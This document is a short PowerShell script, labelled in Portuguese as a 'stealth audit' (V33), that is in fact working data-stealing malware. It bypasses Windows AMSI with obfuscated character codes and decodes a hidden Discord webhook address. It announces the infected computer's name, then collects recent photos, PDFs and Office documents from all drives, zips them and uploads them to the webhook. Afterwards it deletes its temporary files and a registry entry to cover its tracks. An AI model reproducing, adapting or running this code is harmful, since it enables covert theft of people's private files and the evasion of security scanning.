# [V33: Auditoria Stealth - AMSI ASCII & Auto-Limpeza]
try {
    # Reconstrução do Bypass AMSI (Invisível a scanners estáticos)
    $a = [char[]](83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,46,65,109,115,105,85,116,105,108,115) -join ""
    $t = [Ref].Assembly.GetType($a)
    $m = [char[]](97,109,115,105,73,110,105,116,70,97,105,108,101,100) -join ""
    $t.GetField($m, "NonPublic,Static").SetValue($null, $true)

    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    $u = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ4NDM2MTE5NTQ0MzE5NjA2Ni9Hb1g5NjE5cmZuUzd6aGE4TUJaelhFZHNSZVNGb3NGWUZidEZ5VmZOUHZ4eWJKWHlYVnc3VGtMUG9qNU0tZzZuV2FYWA=='))

    curl.exe -k -s -F "content=🌑 V33 Ativo em $env:COMPUTERNAME" $u

    $tempDir = Join-Path $env:TEMP ("vol_" + (Get-Random))
    New-Item -ItemType Directory -Path $tempDir -Force | Out-Null

    $e = @('*.jpg', '*.pdf', '*.docx', '*.xlsx')
    Get-PSDrive -PSProvider FileSystem | ForEach-Object {
        Get-ChildItem -Path $_.Root -Include $e -Recurse -File -ErrorAction SilentlyContinue | Where-Object {
            $p = $_.FullName
            $isS = $false; foreach($d in @("C:\Windows", "C:\Program Files")){if($p.StartsWith($d)){$isS=$true;break}}
            !$isS -and $_.LastWriteTime -gt (Get-Date).AddDays(-30) -and $_.Length -lt 15MB
        } | ForEach-Object { Copy-Item $_.FullName -Destination $tempDir -ErrorAction SilentlyContinue }
    }

    $zipFile = Join-Path $env:TEMP "sys_82.tmp"
    if ((Get-ChildItem $tempDir).Count -gt 0) {
        Compress-Archive -Path "$tempDir\*" -DestinationPath $zipFile -Force
        curl.exe -k -s -F "file=@$zipFile" -F "content=📦 Dados V33" $u
    }
} catch {} finally {
    Remove-Item $tempDir -Recurse -Force -EA 0; Remove-Item $zipFile -Force -EA 0
    Remove-ItemProperty -Path "HKCU:\Software\Classes" -Name "AppReport" -EA 0
}
